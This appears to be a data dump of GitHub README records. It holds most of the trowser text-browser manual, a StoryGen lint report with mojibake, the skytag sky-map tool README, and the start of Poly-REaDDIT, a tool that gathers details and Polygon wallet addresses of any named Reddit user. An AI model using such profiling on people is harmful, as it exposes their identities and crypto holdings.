For performance reasons most search-related commands are executed as background processes, so that the GUI remains responsive during search. For example, this applies to the initial color highlighting, global search highlighting, incremental search while editing search patterns and filling the search result list.  Such background activity is indicated by display of a progress bar and switching the mouse cursor to a watch or hourglass image.  You still can use trowser as usual during this time though.  The background activity is automatically aborted or restarted when a conflicting command is entered (e.g. when the search pattern is modified during global search highlighting.)

Key bindings
------------

Generally, keyboard focus can be moved between control elements (e.g. buttons, check-boxes and text containers) using the *TAB* or *Shift-TAB*.  The widget with the keyboard focus is marked by a black border.  After start-up, keyboard focus is in the main text window.  Functions which are bound to mouse clicks on buttons etc. can be activated via the keyboard using the *Space* bar. Many functions can also be activated via shortcuts: Press the *ALT* key plus the character which is underlines in the button description (e.g. Press ``ALT-c`` to open the *Control* menu, or ``ALT-a`` to simulate a mouse-click on the *All* button at the bottom of the main window.)

In the following descriptions, ``^X`` means *Control-X*, i.e. holding the Control key pressed while pressing the ``X`` key. *ALT* refers to the key to the left of the *Space* bar.  Enclosing quotes must be typed.

Key Bindings in the Main Window
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The commands in this section can be used when the keyboard focus is in the main window.

Commands to move the cursor or change the view:

*Up*, *Down*, *Left*, *Right*
  Move the cursor in the respective direction. When the cursor hits the end of the visible area (i.e. the view), the text is scrolled vertically by a line or horizontally by a character (same as in vim, except for the smoother horizontal scrolling)

*Control-Up*, *Control-Down*, *Control-Left*, *Control-Right*
  Scroll the view by a line or character in the respective direction (not in vim - unless you have added ""map  ^E"" etc. in *.vimrc*)

``h``, ``l``, ``k``, ``j``
  Move the cursor left, right, up or down (same as in vim)

*Return*, ``+``, ``-``
  Move the cursor to the start of the following or preceding line (to be exact: the first non-blank character) (same as in vim)

*Space*, *BackSpace*
  Move the cursor to the next or preceding character (same as in vim)

*Home*, *End*, ``0``, ``$``, ``^``
  Move the cursor to the first or last character of the current line (same as in vim)

*Control-Home*, *Control-End*, ``G``, ``gg``
  Move the cursor to the start or end of the file (same as in vim) Note an equivalent alternative to ``gg`` is ``1g``.

``H``, ``M``, ``L``
  Move the cursor to the start of the line at the top, middle or bottom of the view (same as in vim)

``w``, ``e``, ``b``, ``W``, ``E``, ``B``, ``ge``, ``gE``
  Move the cursor to the start or end of the next or preceding word (same as in vim)

``^e``, ``^y``, ``^d``, ``^u``, ``^f``, ``^b``
  Scroll the screen by a single line, half a screen or a full screen forwards or backwards (same as in vim)

``z``\ *Return*, ``z.``, ``z-``
  Adjusts the view vertically so that the current line is at the top, middle or bottom of the screen and places the cursor on the first non-blank character (same as in vim)  The horizontal view is set to start at the left border.

``zt``, ``zz``, ``zb``
  Adjusts the view so that the current line is at the top, middle or bottom of the screen; the cursor position is unchanged (same as in vim)

``zl``, ``zh``, ``zL``, ``zH``
  Move the view horizontally to the left or right (same as in vim)

``zs``, ``ze``
  Scroll the view horizontally so that the current cursor column is placed at the left or the right side of the screen (as far as possible); in any case the cursor position remains unchanged (same as in vim)

``f``, ``F``
  Search for the following character in the same line to the right or left respectively (same as in vim)

``;``, ``,`` (semicolon, comma)
  Repeat a previous in-line search (\ ``f`` or ``F``) in the same or opposite direction respectively (same as in vim)

``''`` (two apostrophes)
  Moves the cursor to the position before the latest jump (same as in vim and less.)  A ""jump"" is one of the following commands: ``'``, ``G``, ``/``, ``?``, ``n``, ``N``, ``L``, ``M`` and ``H`` (same as in vim.)  Note movements controlled via the GUI, such as the bookmark list or search result list, do not modify the jump list.

``'+``, ``'-``
  Moves the cursor to the next or previous bookmark (not in vim)

``'^``, ``'$``
  Moves the cursor to the start or end of file (same as in less; not in vim)

``^o``, ``^i``
  Moves the cursor to the next older (or newer respectively) position in the jump list (same as in vim; note ``TAB`` which is identical to ``^i`` in vim has a different meaning here.) See ``''`` for a list of commands which are considered jumps and add pre-jump cursor positions to the list.

``1``, ``2``, ... ``9``
  A number without leading zeroes can be used to repeat the subsequent key command or place the cursor on a given line or column (same as in vim)

  For example: ``1G`` places the cursor in the first line of the file; ``10|`` places the cursor in the tenth column of the current line (line and column numbering starts at 1.)  Note the number cannot start with zero, as ``0`` is treated specially (immediately moves the cursor into the first column, same as in vim.)

Searching and repeating:

``/``, ``?``
  Search for the following pattern (same as in vim.) Similar to vim, the keyboard focus is moved from the main text into a small text entry field (command line in vim) Note the previous search pattern is always cleared when re-entering the entry field, but all previously used patterns are still available in the history which can be accessed with the cursor up/down keys like in vim. Note in addition, you can use ``^d`` in the search field to copy the text under the cursor in the main window into the search field, word by word.

  As soon as a search expression is typed into the field, an incremental search is started and matching lines are highlighted. The cursor in the main text isn't actually moved there until the search is completed by pressing ``Return``.  The search can be aborted by ``^C`` or ``Escape``. For more details see `Key bindings in the search entry field`_.

``n``, ``N``
  Repeats the previous search in forward or backwards direction respectively (similar to vim - however in contrary to vim ``n`` always searches forward and ``N`` always backwards because the standard vim behavior of remembering and reversing the search direction with ``N`` is very confusing.)

``*``, ``#``
  Searches for the word under the cursor in forward or backwards direction respectively (same as in vim)  Note when regular expression search mode is not enabled, this command performs a plain sub-string text search. Else, word boundary matches are placed around the search text, as done by vim.

``&``
  Remove the highlighting of previous search matches (not in vim as such, but can be added via ``map & :nohlsearch^M`` in *.vimrc*)  Note this does not disable highlighting in subsequent searches.

*ALT-* ``f``
  Moves the focus in the search search entry field.  This is equivalent to ``/`` or ``?`` but without changing the search direction (not in vim) This is equivalent to clicking into the ""Find:"" entry field with the mouse button.

*ALT-* ``n``, *ALT-* ``p``
  Repeat a previous search, equivalent to ``n`` and ``N`` (not in vim)

*ALT-* ``h``
  Enable the ""Highlight all"" option, i.e. highlight all lines in the text where the current search pattern matches (not in vim)

*ALT-* ``a``
  Open the search result window and fill it with all text lines which match the current search pattern (not in vim)

*ALT-* ``N``, *ALT-* ``P``
  Open the search result window and fill it with all text lines below or above the current cursor position respectively which match the current search pattern (not in vim)

The following commands can be used to change the selection.

Note that selected text is automatically exported and can be pasted into other applications.

*Shift-Left*, *Shift-Right*, *Shift-Up*, *Shift-Down*
  Starts or extends the selection in the respective direction (not in vim) Note that trowser only supports the character-wise selection mode (like ``v`` in vim)

*Shift-Home*, *Shift-End*
  Starts or extends the selection from the current cursor position to the start or end of the current line (not in vim)

*Control-Shift-Home*, *Control-Shift-End*
  Starts or extends the selection from the current cursor position to the start or end of the file (not in vim)

``^c``
  Copies the currently selected text to the clipboard.  (Note that this command is actually superfluous as the text is copied as soon as some text is selected.)

Misc. commands (none of these are in vim):

``m``
  This key, or double-clicking into a text line, toggles a bookmark in the respective line (different from vim; note setting named bookmarks is not supported.)  Additionally the view of the search result list, if open, will be centered around the line (even if the marked line is not included in the search results.)

``i``
  Insert (i.e. copy) the text line holding the cursor into the search result window. If a selection exists and is currently visible, the selected lines are copied instead. (Note the restriction to visibility of the selection exists to avoid confusion about ``i`` not working on the current text line.)

``u``, ``^r``
  Undo or redo respectively the last addition or removal of text lines in the search list done by ``i`` or ""Search All"" (different from vim.)

*ALT-* ``+``, *ALT-* ``-``
  Increases or decreases the font size for the text content. Note the behavior when reaching the maximum or minimum font size is undefined.

*ALT-* ``w``
  Toggle line-wrap for text in the main window (i.e. text lines which are longer than the window width will wrap into the next line.)

Key Bindings in the Search Entry Field
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The following commands can be used when the keyboard focus is in the **search entry field** at the bottom of the main window:

*Return*
  Store the current pattern in the search history and return focus to the main window with the cursor on the next match (same as vim)   Note the cursor is already moved via incremental search when entering the text (including the highlighting of adjacent matches) so the search and cursor movement need not be done again here.  This command is equivalent to leaving the search field by clicking with the mouse outside or switching keyboard focus via *TAB* or *Shift-TAB*.

*Escape*, ``^c``
  Abort the current search, i.e. return focus to the main window and place the cursor on the previous position. The search pattern in the entry field is still pushed onto the history (same as in vim.)

``^a``, ``^e``
  Move the insertion cursor to the start or end of the search text entry field (\ ``^e`` is same as in vim; ``^a`` is not in vim.)  Note: movement and selection via cursor keys works in the same way as described for the main text.

``^n``, ``^N``
  Jump to the next or previous match respectively for the current pattern using incremental search.  Note these commands do not affect the fall-back cursor position, i.e. when the search is aborted or the pattern is changed, the cursor returns to the original start position (not in vim)

*Up*, *Down*
  Copies the previous or next pattern in the search history into the entry field. If the entry field already contains some text, the search is restricted to patterns with the same prefix.

``^d``, ``^D``
  Complete the search text with the text to the right or left of the current match in the main text (i.e. right or left of the text marked with green background color.)

``^x``
  Remove the currently used pattern in the search history, if the current pattern was copied by use of *Up* or *Down* (not in vim)

*ALT-* ``n``, *ALT-* ``p``
  Same as pressing the *Next* or *Previous* buttons respectively, i.e. search for the current pattern in forward or backwards direction and add the pattern to the search history. Keyboard focus remains in the search entry field.

*ALT-* ``a``
  Open the search result window and fill it with all text lines which match the current search pattern (not in vim)  Additionally, keyboard focus is moved back into the main window.

*ALT-* ``N``, *ALT-* ``P``
  Open the search result window and fill it with all text lines below or above the current cursor position respectively which match the current search pattern (not in vim)  Additionally, the keyboard focus is moved back into the main window.

*ALT-* ``c``
  Toggle the ""match case"" option, i.e. equivalent to clicking on *Match case* (not in vim)

*ALT-* ``e``
  Toggle the regular expression search option, i.e. equivalent to clicking on button *Reg.Exp.* (not in vim.)  When this option is enabled, special characters are parsed according to *re_syntax* Tcl manual page; the syntax is almost identical to Perl with few exceptions (notably ``\m`` and ``\M`` to match beginning and end of words)  When the option is not enabled, no characters have a special meaning (i.e. even ""\ ``*``"") and a simple sub-string search is started.

  Note: for performance reasons it's recommended to use case-sensitive sub-string searches for color highlighting, especially if you have many patterns. This is usually faster than combining multiple patterns with ``|`` in a regular expression.

Key Bindings in the Search Result Window
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The following commands can be used in the search result window (i.e. the list filled by ""Search All"" and lines copied from the main window via the ``i`` key binding.)

For users who prefer controls via the mouse it should be noted that there's a context menu which opens via a click with the right mouse button into a line, which has equivalent commands to the ones listed below.

``m``
  Bookmark the currently selected line.  The line will be marked both in the search result window and the main window.

*Delete*
  Remove the selected lines from the search result list.

``u``
  Undo the last addition or removal.

``^r``
  Redo the last addition or removal (if previously undone.)

``/``, ``?``
  Moves the keyboard focus in the search entry field in the main window for entering a search expression. The behavior of the search is the same as in the main window. When leaving the search entry field via ``Return`` or ``Escape``, the keyboard focus returns to the search list.

``n``, ``N``
  Repeat the last search in downwards or upwards direction respectively. The search is restricted to lines in the search result window.

*Escape*
  Abort an ongoing search. Lines which were already found and added to the search result window will remain. (You can still remove these lines using ""undo"".)

``&``
  Same as in the main window: Remove the highlighting of previous search matches (same as ``:nohlsearch`` in vim) and of lines highlighted in the main window by positioning via selections in the search result list.

In addition to the above, the general selection dialog key bindings in the next section also work in the search result window.

Key Bindings in Dialogs
~~~~~~~~~~~~~~~~~~~~~~~

The following commands can be used to manipulate the selection cursor in all dialogs which display lists (i.e. search result list, search history, bookmarks, highlight pattern editor)  Note there's no distinction between selection and cursor in these dialogs. This means you cannot move the selection cursor from line A to D using the keyboard without temporarily selecting lines B and C in-between.

Of course you can also manipulate the selection via the mouse in the usual ways, i.e. clicking on single entries, or dragging the mouse to select multiple elements, or pressing the mouse while holding Control or Shift keys pressed to add or remove single elements or extend the selection respectively.

*Up*, *Down*
  Move the selection cursor one line up or down respectively, scrolling the view if necessary.  If no line is selected yet, the cursor is placed on the first or last line; if the previously selected line is still in the visible area, the cursor is placed there instead.

*Home*, *End*
  Move the selection cursor on the first or last item in the list.

*Shift-Up*, *Shift-Down*, *Shift-Home*, *Shift-End*
  Extend or reduce the selection in the given direction, or to the start or end of the list.

*Page-Up*, *Page-Down*
  Scroll the view up or down by a page. These commands remove the selection cursor.

Options
-------

The following command line options are available:

**-h** *limit*, **--head=limit**
  This option specifies the maximum number of bytes read from the start of the input file or stream, i.e. any following text is silently ignored.

  The limit value is remembered in the configuration file and used in the next invocation unless overridden.  When neither **-h** or **-t** are specified and data is loaded from a stream via STDIN, a small dialog window pops up when the buffer limit is exceeded. This allows the user to select between head and tail modes manually.

**-t** *limit*, **--tail=limit**
  This option specifies the maximum number of bytes to be read into the display buffer.  If the input is a file which is larger then the given buffer limit, text at the beginning of the file is skipped. If the input is a stream, all data is read into a temporary queue until the end-of-stream is reached; then the last *limit* number of bytes which were read from the stream are loaded into the display buffer.

  The limit value is remembered in the configuration file and used in the next invocation unless overridden.

**-r** *path*, **--rcfile=path**
  This option can be used to specify an alternate configuration file. When this option is not present, the configuration file is stored in the home directory, see section FILES.

Environment
-----------

**trowser** only evaluates the standard variables **DISPLAY** (X11 display address) and **HOME** (home directory, for storing the configuration file.)

Files
-----

**$HOME/.config/trowser/trowser.py.rc**
  *UNIX*: Configuration file where all personal settings and the search history are stored. Per default this file is created in your home directory, but a different path and file name can be specified with the **--rcfile** option (see `Options`_).

  During updates to this file, trowser temporarily creates a file called ``.trowserc.XXXXX.tmp`` in the home directory, where ""XXXXX"" is a random number. The old file is then replaced with this new file. This procedure will obviously fail if your home directory is not writable.

Caveats
-------

Currently only one pattern list for color highlighting is supported. Hence different highlighting for different file types can only be done by choosing different configuration files when starting trowser (see the *--rcfile* option.)

Vim compatibility: Not all vim navigation commands are implemented; Command repetition is supported only for a small sub-set of commands; Some commands behave slightly differently from vim (most notably the bookmark related commands.) vim's range and selection commands are not supported at all.

Search repetition by pressing ""Next"" or ""Previous"" or the search history dialog is currently not interruptable and may take quite a while if the next match is several MB away. (This can be avoided by repeating the search via the entry field's internal search history, i.e. ``/`` and *Up*)

Searching with regular expressions is very slow in large files. This is unfortunately a property of the ""text"" Tk widget. Thus use of regular expressions for highlighting is not recommended. (As a work-around, trowser automatically falls back to plain string search if there are no control characters in the search expression.)

Some GUI activity (e.g. selecting a range on text with the mouse) will render active background tasks uninteruptable, i.e. the GUI will become unresponsive until the background task has completed.

File store and load dialogs do not maintain a history of previously used files or directories. (This is so because it's expected that these features will not be used very often.)

The pipe load and search result list dialogs are not designed very well yet (i.e. even more so than the other dialogs). Suggestions for improvements are welcome.

Some configuration options cannot be modified via the GUI and require manually editing the configuration file.




",tomzox/trowser
storygensn,https://github.com/SNorebo/StoryGen,4,3992,3965,"# StoryGen
Python a gyakorlatban beadandÃ³, 2023 tavasz

## Pylint eredmÃ©ny (pylint StoryGen/*.py):
<code>Your code has been rated at 6.88/10</code>

## Flake8 eredmÃ©ny (flake8 .):
<code>.\StoryGen\app.py:3:1: F403 'from home_frame import *' used; unable to detect undefined names
.\StoryGen\app.py:4:1: F403 'from previous_generations_frame import *' used; unable to detect undefined names
.\StoryGen\app.py:5:1: F403 'from key_frame import *' used; unable to detect undefined names
.\StoryGen\app.py:6:1: F403 'from navigation_frame import *' used; unable to detect undefined names
.\StoryGen\app.py:23:27: F405 'HomeFrame' may be undefined, or defined from star imports: home_frame, key_frame, navigation_frame, previous_generations_frame
.\StoryGen\app.py:28:43: F405 'PreviousGenerationsFrame' may be undefined, or defined from star imports: home_frame, key_frame, navigation_frame, previous_generations_frame
.\StoryGen\app.py:33:26: F405 'KeyFrame' may be undefined, or defined from star imports: home_frame, key_frame, navigation_frame, previous_generations_frame
.\StoryGen\app.py:33:80: E501 line too long (87 > 79 characters)
.\StoryGen\app.py:36:33: F405 'NavigationFrame' may be undefined, or defined from star imports: home_frame, key_frame, navigation_frame, previous_generations_frame
.\StoryGen\home_frame.py:2:1: F403 'from openai_api import *' used; unable to detect undefined names
.\StoryGen\home_frame.py:33:12: F405 'get_api_key' may be undefined, or defined from star imports: openai_api
.\StoryGen\home_frame.py:36:80: E501 line too long (87 > 79 characters)
.\StoryGen\home_frame.py:56:80: E501 line too long (82 > 79 characters)
.\StoryGen\home_frame.py:88:20: F405 'get_response' may be undefined, or defined from star imports: openai_api
.\StoryGen\home_frame.py:96:80: E501 line too long (88 > 79 characters)
.\StoryGen\home_frame.py:133:80: E501 line too long (81 > 79 characters)
.\StoryGen\home_frame.py:142:80: E501 line too long (80 > 79 characters)
.\StoryGen\home_frame.py:156:80: E501 line too long (88 > 79 characters)
.\StoryGen\home_frame.py:163:80: E501 line too long (111 > 79 characters)
.\StoryGen\home_frame.py:177:80: E501 line too long (80 > 79 characters)
.\StoryGen\home_frame.py:193:80: E501 line too long (81 > 79 characters)
.\StoryGen\home_frame.py:195:80: E501 line too long (84 > 79 characters)
.\StoryGen\home_frame.py:227:80: E501 line too long (113 > 79 characters)
.\StoryGen\home_frame.py:234:80: E501 line too long (89 > 79 characters)
.\StoryGen\home_frame.py:262:80: E501 line too long (85 > 79 characters)
.\StoryGen\home_frame.py:339:22: F405 'generate_image' may be undefined, or defined from star imports: openai_api
.\StoryGen\key_frame.py:54:80: E501 line too long (80 > 79 characters)
.\StoryGen\navigation_frame.py:9:80: E501 line too long (81 > 79 characters)
.\StoryGen\navigation_frame.py:32:80: E501 line too long (86 > 79 characters)
.\StoryGen\navigation_frame.py:33:80: E501 line too long (84 > 79 characters)
.\StoryGen\navigation_frame.py:101:80: E501 line too long (85 > 79 characters)
.\StoryGen\navigation_frame.py:145:80: E501 line too long (80 > 79 characters)
.\StoryGen\openai_api.py:23:80: E501 line too long (88 > 79 characters)
.\StoryGen\openai_api.py:50:80: E501 line too long (88 > 79 characters)
.\StoryGen\openai_api.py:53:80: E501 line too long (84 > 79 characters)
.\StoryGen\previous_generations_frame.py:28:80: E501 line too long (81 > 79 characters)
.\StoryGen\previous_generations_frame.py:87:80: E501 line too long (83 > 79 characters)
.\StoryGen\previous_generations_frame.py:95:80: E501 line too long (83 > 79 characters)
.\StoryGen\previous_generations_frame.py:96:80: E501 line too long (82 > 79 characters)
.\StoryGen\test.py:24:13: F841 local variable 'response' is assigned to but never used
.\StoryGen\test.py:30:80: E501 line too long (83 > 79 characters)
.\StoryGen\test.py:44:80: E501 line too long (88 > 79 characters)</code>
","# StoryGen
Python a gyakorlatban beadandÃ³, 2023 tavasz

## Pylint eredmÃ©ny (pylint StoryGen/*.py):
Your code has been rated at 6.88/10

## Flake8 eredmÃ©ny (flake8 .):
.\StoryGen\app.py:3:1: F403 'from home_frame import *' used; unable to detect undefined names
.\StoryGen\app.py:4:1: F403 'from previous_generations_frame import *' used; unable to detect undefined names
.\StoryGen\app.py:5:1: F403 'from key_frame import *' used; unable to detect undefined names
.\StoryGen\app.py:6:1: F403 'from navigation_frame import *' used; unable to detect undefined names
.\StoryGen\app.py:23:27: F405 'HomeFrame' may be undefined, or defined from star imports: home_frame, key_frame, navigation_frame, previous_generations_frame
.\StoryGen\app.py:28:43: F405 'PreviousGenerationsFrame' may be undefined, or defined from star imports: home_frame, key_frame, navigation_frame, previous_generations_frame
.\StoryGen\app.py:33:26: F405 'KeyFrame' may be undefined, or defined from star imports: home_frame, key_frame, navigation_frame, previous_generations_frame
.\StoryGen\app.py:33:80: E501 line too long (87 > 79 characters)
.\StoryGen\app.py:36:33: F405 'NavigationFrame' may be undefined, or defined from star imports: home_frame, key_frame, navigation_frame, previous_generations_frame
.\StoryGen\home_frame.py:2:1: F403 'from openai_api import *' used; unable to detect undefined names
.\StoryGen\home_frame.py:33:12: F405 'get_api_key' may be undefined, or defined from star imports: openai_api
.\StoryGen\home_frame.py:36:80: E501 line too long (87 > 79 characters)
.\StoryGen\home_frame.py:56:80: E501 line too long (82 > 79 characters)
.\StoryGen\home_frame.py:88:20: F405 'get_response' may be undefined, or defined from star imports: openai_api
.\StoryGen\home_frame.py:96:80: E501 line too long (88 > 79 characters)
.\StoryGen\home_frame.py:133:80: E501 line too long (81 > 79 characters)
.\StoryGen\home_frame.py:142:80: E501 line too long (80 > 79 characters)
.\StoryGen\home_frame.py:156:80: E501 line too long (88 > 79 characters)
.\StoryGen\home_frame.py:163:80: E501 line too long (111 > 79 characters)
.\StoryGen\home_frame.py:177:80: E501 line too long (80 > 79 characters)
.\StoryGen\home_frame.py:193:80: E501 line too long (81 > 79 characters)
.\StoryGen\home_frame.py:195:80: E501 line too long (84 > 79 characters)
.\StoryGen\home_frame.py:227:80: E501 line too long (113 > 79 characters)
.\StoryGen\home_frame.py:234:80: E501 line too long (89 > 79 characters)
.\StoryGen\home_frame.py:262:80: E501 line too long (85 > 79 characters)
.\StoryGen\home_frame.py:339:22: F405 'generate_image' may be undefined, or defined from star imports: openai_api
.\StoryGen\key_frame.py:54:80: E501 line too long (80 > 79 characters)
.\StoryGen\navigation_frame.py:9:80: E501 line too long (81 > 79 characters)
.\StoryGen\navigation_frame.py:32:80: E501 line too long (86 > 79 characters)
.\StoryGen\navigation_frame.py:33:80: E501 line too long (84 > 79 characters)
.\StoryGen\navigation_frame.py:101:80: E501 line too long (85 > 79 characters)
.\StoryGen\navigation_frame.py:145:80: E501 line too long (80 > 79 characters)
.\StoryGen\openai_api.py:23:80: E501 line too long (88 > 79 characters)
.\StoryGen\openai_api.py:50:80: E501 line too long (88 > 79 characters)
.\StoryGen\openai_api.py:53:80: E501 line too long (84 > 79 characters)
.\StoryGen\previous_generations_frame.py:28:80: E501 line too long (81 > 79 characters)
.\StoryGen\previous_generations_frame.py:87:80: E501 line too long (83 > 79 characters)
.\StoryGen\previous_generations_frame.py:95:80: E501 line too long (83 > 79 characters)
.\StoryGen\previous_generations_frame.py:96:80: E501 line too long (82 > 79 characters)
.\StoryGen\test.py:24:13: F841 local variable 'response' is assigned to but never used
.\StoryGen\test.py:30:80: E501 line too long (83 > 79 characters)
.\StoryGen\test.py:44:80: E501 line too long (88 > 79 characters)
",snorebo/storygen
skytag,https://github.com/thespacedoctor/skytag,0,3676,3593,"# skytag

<!-- INFO BADGES -->  

[![](https://img.shields.io/pypi/pyversions/skytag)](https://pypi.org/project/skytag/)
[![](https://img.shields.io/pypi/v/skytag)](https://pypi.org/project/skytag/)
[![](https://img.shields.io/conda/vn/conda-forge/skytag)](https://anaconda.org/conda-forge/skytag)
[![](https://pepy.tech/badge/skytag)](https://pepy.tech/project/skytag)
[![](https://img.shields.io/github/license/thespacedoctor/skytag)](https://github.com/thespacedoctor/skytag)

<!-- STATUS BADGES -->  

[![](https://soxs-eso-data.org/ci/buildStatus/icon?job=skytag%2Fmain&subject=build%20main)](https://soxs-eso-data.org/ci/blue/organizations/jenkins/skytag/activity?branch=main)
[![](https://soxs-eso-data.org/ci/buildStatus/icon?job=skytag%2Fdevelop&subject=build%20dev)](https://soxs-eso-data.org/ci/blue/organizations/jenkins/skytag/activity?branch=develop)
[![](https://cdn.jsdelivr.net/gh/thespacedoctor/skytag@main/coverage.svg)](https://raw.githack.com/thespacedoctor/skytag/main/htmlcov/index.html)
[![](https://readthedocs.org/projects/skytag/badge/?version=main)](https://skytag.readthedocs.io/en/main/)
[![](https://img.shields.io/github/issues/thespacedoctor/skytag/type:%20bug?label=bug%20issues)](https://github.com/thespacedoctor/skytag/issues?q=is%3Aissue+is%3Aopen+label%3A%22type%3A+bug%22+) 

*Annotate transient sources or galaxies with the percentage credibility region they reside within on a given HealPix sky map.*.

Documentation for skytag is hosted by [Read the Docs](https://skytag.readthedocs.io/en/main/) ([development version](https://skytag.readthedocs.io/en/develop/) and [main version](https://skytag.readthedocs.io/en/main/)). The code lives on [github](https://github.com/thespacedoctor/skytag). Please report any issues you find [here](https://github.com/thespacedoctor/skytag/issues). If you want to contribute, [pull requests](https://github.com/thespacedoctor/skytag/pulls) are welcomed! 
true

## Features

- A command-line tool to report the credibility region a sky-location is found within on a HealPix skymap.  
- Providing a MJD will also return the time since the map event.  
- A python interface to provide the same functionality reported above, but can handle large lists of sky-locations or transient events.  

## Installation

The easiest way to install skytag is to use `conda`:

``` bash
conda create -n skytag python=3.11 pip skytag -c conda-forge
conda activate skytag
```

To upgrade to the latest version of skytag use the command:

``` bash
conda upgrade skytag -c conda-forge
```

It is also possible to install via pip if required:

``` bash
pip install skytag
```

To check installation was successful run `skytag -v`. This should return the version number of the install.

## Command-Line 

Here is the command-line usage:

```bash 
Usage:
    skytag <ra> <dec> <mapPath>
    skytag <ra> <dec> <mjd> <mapPath>
```

If you need an example skymap, [download one from here](https://github.com/thespacedoctor/skytag/raw/main/skytag/commonutils/tests/input/bayestar.multiorder.fits).

For example, to find the probability of the location RA=170.343532, Dec=-40.532255 then run:

```bash 
skytag 170.343532 -40.532255 bayestar.multiorder.fits
```

This returns:

> This location is found in the 74.55 credibility region of the map.

If you also supply an MJD:

```bash 
skytag 170.343532 -40.532255 60065.2232 bayestar.multiorder.fits
```

We get:

> This transient is found in the 74.55 credibility region, and occurred 2.85564 days after the map event.

## Python API

To use skytag in your own Python code, [see here](_autosummary/skytag.commonutils.prob_at_location.html#skytag.commonutils.prob_at_location).

","# skytag

  

[![](https://img.shields.io/pypi/pyversions/skytag)](https://pypi.org/project/skytag/)
[![](https://img.shields.io/pypi/v/skytag)](https://pypi.org/project/skytag/)
[![](https://img.shields.io/conda/vn/conda-forge/skytag)](https://anaconda.org/conda-forge/skytag)
[![](https://pepy.tech/badge/skytag)](https://pepy.tech/project/skytag)
[![](https://img.shields.io/github/license/thespacedoctor/skytag)](https://github.com/thespacedoctor/skytag)

  

[![](https://soxs-eso-data.org/ci/buildStatus/icon?job=skytag%2Fmain&subject=build%20main)](https://soxs-eso-data.org/ci/blue/organizations/jenkins/skytag/activity?branch=main)
[![](https://soxs-eso-data.org/ci/buildStatus/icon?job=skytag%2Fdevelop&subject=build%20dev)](https://soxs-eso-data.org/ci/blue/organizations/jenkins/skytag/activity?branch=develop)
[![](https://cdn.jsdelivr.net/gh/thespacedoctor/skytag@main/coverage.svg)](https://raw.githack.com/thespacedoctor/skytag/main/htmlcov/index.html)
[![](https://readthedocs.org/projects/skytag/badge/?version=main)](https://skytag.readthedocs.io/en/main/)
[![](https://img.shields.io/github/issues/thespacedoctor/skytag/type:%20bug?label=bug%20issues)](https://github.com/thespacedoctor/skytag/issues?q=is%3Aissue+is%3Aopen+label%3A%22type%3A+bug%22+) 

*Annotate transient sources or galaxies with the percentage credibility region they reside within on a given HealPix sky map.*.

Documentation for skytag is hosted by [Read the Docs](https://skytag.readthedocs.io/en/main/) ([development version](https://skytag.readthedocs.io/en/develop/) and [main version](https://skytag.readthedocs.io/en/main/)). The code lives on [github](https://github.com/thespacedoctor/skytag). Please report any issues you find [here](https://github.com/thespacedoctor/skytag/issues). If you want to contribute, [pull requests](https://github.com/thespacedoctor/skytag/pulls) are welcomed! 
true

## Features

- A command-line tool to report the credibility region a sky-location is found within on a HealPix skymap.  
- Providing a MJD will also return the time since the map event.  
- A python interface to provide the same functionality reported above, but can handle large lists of sky-locations or transient events.  

## Installation

The easiest way to install skytag is to use `conda`:

``` bash
conda create -n skytag python=3.11 pip skytag -c conda-forge
conda activate skytag
```

To upgrade to the latest version of skytag use the command:

``` bash
conda upgrade skytag -c conda-forge
```

It is also possible to install via pip if required:

``` bash
pip install skytag
```

To check installation was successful run `skytag -v`. This should return the version number of the install.

## Command-Line 

Here is the command-line usage:

```bash 
Usage:
    skytag   
    skytag    
```

If you need an example skymap, [download one from here](https://github.com/thespacedoctor/skytag/raw/main/skytag/commonutils/tests/input/bayestar.multiorder.fits).

For example, to find the probability of the location RA=170.343532, Dec=-40.532255 then run:

```bash 
skytag 170.343532 -40.532255 bayestar.multiorder.fits
```

This returns:

> This location is found in the 74.55 credibility region of the map.

If you also supply an MJD:

```bash 
skytag 170.343532 -40.532255 60065.2232 bayestar.multiorder.fits
```

We get:

> This transient is found in the 74.55 credibility region, and occurred 2.85564 days after the map event.

## Python API

To use skytag in your own Python code, [see here](_autosummary/skytag.commonutils.prob_at_location.html#skytag.commonutils.prob_at_location).

",thespacedoctor/skytag
poly-readdit,https://github.com/aaarghhh/Poly-REaDDIT,0,2646,2579,"# Poly-REaDDIT
## A tool for gathering information and Polygon address NFT details about any Reddit users.
Since last year Reddit introduced a way to costumize your profile with NFTs. This tool is a way to gather information, its NFTs and the Polygon address of any Reddit user.

<div align=""center"">
     <img alt=""Avatar"" src=""img/img.png"">
</div>

When you purchase or mint a Reddit NFT, Reddit client will create a Polygon wallet/address for you. This address is linked to your Reddit account and can be used to send and receive NFTs.
The wallet is related to the Poligon network, so you can use it to send and receive NFTs from other Polygon wallets or sell it. Poligon is a Layer 2 scaling solution for Ethereum.

The NFT will bring the ability to create a new revenue stream for Reddit and its users, and also customize the aspect of the profile. The related NFTs are listed on OpenSea and PolygonScan.



## Installation and usage
```
$ git clone
$ cd Poly-REaDDIT
$ pip install -r requirements.txt
```
Or directly install the requirements with pip:
```
$ pip install poly-readdit
```
Then you can run the tool with:
```
$ python ./poly-readdit/poly-readdit.py -username xxxxxx
```
Or if you installed via pip directly with:
```
$ polyreaddit -username xxxxxx
```
## Example
```
./poly-readdit/poly-readdit.py -username xxxxxxx

⠀⠀⠀⢠⣾⣿⣿⣿⣿⣶⣤⣤⣾⠛⠻⣷⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⡏⠉⠉⠙⠛⠿⠿⣷⣀⣀⣿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀
⠀⠀⣀⣤⣀⠀⢀⣠⣤⣶⣶⣿⣿⣿⣿⣿⣿⣶⣶⣤⣄⡀⠀⣀⣤⣀⠀⠀
⢰⡿⠋⢉⣹⣿⣿⣿⠿⠟⠛⠋⠉⠉⠉⠉⠙⠛⠻⠿⣿⣿⣿⣏⡉⠙⢿⡆
⢸⣇⣠⣾⣿⡿⠋⠀⠀⣠⣤⣀⠀⠀⠀⠀⣀⣤⣄⠀⠀⠙⢿⣿⣷⣄⣸⡗
⠈⢻⣿⣿⠋⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠙⣿⣿⡟⠁
